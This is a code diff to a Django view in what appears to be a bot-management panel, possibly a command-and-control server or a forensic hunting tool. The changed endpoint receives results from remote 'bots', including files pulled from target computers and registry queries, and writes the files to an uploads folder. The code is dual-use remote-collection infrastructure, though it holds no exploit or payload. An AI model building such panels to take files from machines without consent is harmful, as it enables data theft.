@@ -5,7 +5,7 @@ from django.core.exceptions import ObjectDoesNotExist
 
 from panel.models import Bot, Artifact, Query, Command, Config #, Hunt
 
-import os, urllib, datetime, multiprocessing, json
+import os, urllib, datetime, multiprocessing, json, re
 # Create your views here.
 
 FILE_DIRECTORY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "UPLOADS")
@@ -194,33 +194,33 @@ def command_results(request):
 	if request.method == 'GET':
 		raise Http404
 
-	command_results = json.loads(request.body)
-	print command_results
-	for c in command_results:
-		id = c['command_id']
-		done = c['done']
-		data = c['data']
-		print data
+	c = request.POST
+	
+	id = c['command_id']
+	done = c['done']
+	data = c['data']
 
-		cmd = get_object_or_404(Command, id=id)
-		cmd.done = c['done']
+	cmd = get_object_or_404(Command, id=id)
+	cmd.done = c['done']
 
-		if cmd.type == 'getfile' or cmd.type == 'getfileenc' and cmd.done == True:
-			print cmd.body
-			filename = cmd.body.replace("\\", '_').replace('/', '_')
-			print filename
-			filename = ("%s-%s.file" % (cmd.target.computer_name, filename))
-			if cmd.type == 'getfileenc': filename += '.encrypted'
-			open(os.path.join(FILE_DIRECTORY, filename), 'wb').write(c['data'])
-			cmd.data = "Saved data to %s" % os.path.join(FILE_DIRECTORY, filename)
+	if cmd.type == 'getfile' or cmd.type == 'getfileenc' and cmd.done == True:
+		print cmd.body
+		filename = re.sub(r'[^\w]', '_', cmd.body)
+		print filename
+		filename = "%s-%s.file" % (cmd.target.computer_name, filename)
+		if cmd.type == 'getfileenc': filename += '.encrypted'
+		with open(os.path.join(FILE_DIRECTORY, filename), 'wb+') as f:
+			f.write(c['data'].decode('base64'))
+		print "Data written to {}".format(os.path.join(FILE_DIRECTORY, filename))
+		cmd.data = "Saved data to %s" % os.path.join(FILE_DIRECTORY, filename)
 
-		if cmd.type == 'regget' and cmd.done == True:
-			cmd.data = data
+	if cmd.type == 'regget' and cmd.done == True:
+		cmd.data = data
 
-		if cmd.type == 'regfind' and cmd.done == True:
-			cmd.data = data
+	if cmd.type == 'regfind' and cmd.done == True:
+		cmd.data = data
 
-		cmd.save()
+	cmd.save()
 
 	return HttpResponse("OK")
 
